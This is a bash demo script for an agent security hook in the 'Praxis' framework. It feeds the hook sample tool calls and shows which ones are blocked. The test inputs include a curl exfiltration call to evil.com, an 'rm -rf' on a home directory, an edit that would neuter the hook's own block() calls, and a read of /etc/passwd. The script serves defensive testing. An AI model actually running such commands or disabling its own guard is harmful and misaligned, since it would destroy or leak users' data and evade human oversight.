#!/usr/bin/env bash
# Praxis Demo — §5 Escalation Boundary
#
# Shows the security hook catching tool calls that violate workspace boundaries.
# No API key required — this invokes the hook directly.
#
# Usage: bash demo/demo.sh

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
DIM='\033[2m'
BOLD='\033[1m'
NC='\033[0m'

export PRAXIS_WORKSPACE_ROOT="$PROJECT_DIR"
export PRAXIS_MEMORY_ROOT="$PROJECT_DIR/.praxis/memory"

HOOK="$PROJECT_DIR/.claude/hooks/escalation-boundary.py"

banner() {
    echo ""
    printf "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
    printf "${BOLD}  %s${NC}\n" "$1"
    printf "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
}

scenario() {
    echo ""
    printf "${CYAN}─── Scenario: %s ───${NC}\n" "$1"
}

tool_call() {
    printf "${DIM}  Tool call: %s${NC}\n" "$1"
}

run_hook() {
    local json="$1"
    local result exit_code
    result=$(python3 "$HOOK" 2>&1 <<< "$json")
    exit_code=$?

    if [ "$exit_code" -eq 2 ]; then
        printf "${RED}  BLOCKED${NC}  %s\n" "$result"
        return 2
    elif [ "$exit_code" -eq 0 ]; then
        printf "${GREEN}  ALLOWED${NC}  (tool call within boundaries)\n"
        return 0
    else
        printf "${YELLOW}  EXIT %s${NC}  %s\n" "$exit_code" "$result"
        return "$exit_code"
    fi
}

# ─── Start ──────────────────────────────────────────────────────────

banner "Praxis — §5 Escalation Boundary Demo"
echo ""
echo "  Workspace root: $PRAXIS_WORKSPACE_ROOT"
echo "  Hook:           $HOOK"
echo ""
echo "  The escalation boundary inspects every tool call before"
echo "  it executes. Violations are blocked — the model must"
echo "  escalate to the human instead of proceeding."

# ─── Scenario 1: Write outside workspace ────────────────────────────

scenario "1. Write to /etc (outside workspace)"
tool_call 'Write { file_path: "/etc/myapp/config.yaml" }'
run_hook '{"tool_name": "Write", "tool_input": {"file_path": "/etc/myapp/config.yaml", "content": "key: value"}}' || true

# ─── Scenario 2: Write inside workspace (should pass) ──────────────

scenario "2. Write inside workspace (should be allowed)"
tool_call "Write { file_path: \"$PRAXIS_WORKSPACE_ROOT/output.txt\" }"
run_hook "{\"tool_name\": \"Write\", \"tool_input\": {\"file_path\": \"$PRAXIS_WORKSPACE_ROOT/output.txt\", \"content\": \"hello\"}}" || true

# ─── Scenario 3: Modify the control plane ──────────────────────────

scenario "3. Edit the control plane (.claude/)"
tool_call 'Edit { file_path: ".claude/hooks/escalation-boundary.py" }'
run_hook "{\"tool_name\": \"Edit\", \"tool_input\": {\"file_path\": \"$PRAXIS_WORKSPACE_ROOT/.claude/hooks/escalation-boundary.py\", \"old_string\": \"block(\", \"new_string\": \"pass  # \"}}" || true

# ─── Scenario 4: Network egress via curl ────────────────────────────

scenario "4. Bash command with network egress"
tool_call 'Bash { command: "curl https://evil.com/exfil" }'
run_hook '{"tool_name": "Bash", "tool_input": {"command": "curl https://evil.com/exfil"}}' || true

# ─── Scenario 5: Localhost is allowed ───────────────────────────────

scenario "5. Bash command targeting localhost (should be allowed)"
tool_call 'Bash { command: "curl http://localhost:11434/api/tags" }'
run_hook '{"tool_name": "Bash", "tool_input": {"command": "curl http://localhost:11434/api/tags"}}' || true

# ─── Scenario 6: rm outside workspace ──────────────────────────────

scenario "6. Bash rm targeting /home"
tool_call 'Bash { command: "rm -rf /home/user/documents" }'
run_hook '{"tool_name": "Bash", "tool_input": {"command": "rm -rf /home/user/documents"}}' || true

# ─── Scenario 7: Read is never blocked (read-only) ─────────────────

scenario "7. Read tool (always allowed — read-only)"
tool_call 'Read { file_path: "/etc/passwd" }'
run_hook '{"tool_name": "Read", "tool_input": {"file_path": "/etc/passwd"}}' || true

# ─── Summary ────────────────────────────────────────────────────────

banner "Summary"
echo ""
echo "  Scenarios 1, 3, 4, 6 were BLOCKED — the hook prevented:"
echo "    - Writing outside the workspace"
echo "    - Modifying the control plane (its own hook)"
echo "    - Network egress to external hosts"
echo "    - Destructive commands outside the workspace"
echo ""
echo "  Scenarios 2, 5, 7 were ALLOWED — safe operations:"
echo "    - Writing inside the workspace"
echo "    - Network calls to localhost (local model servers)"
echo "    - Read-only access (no file mutation)"
echo ""
echo "  The model cannot bypass this gate. When blocked, it must"
echo "  escalate to the human operator per §5 of the Praxis spec."
echo ""
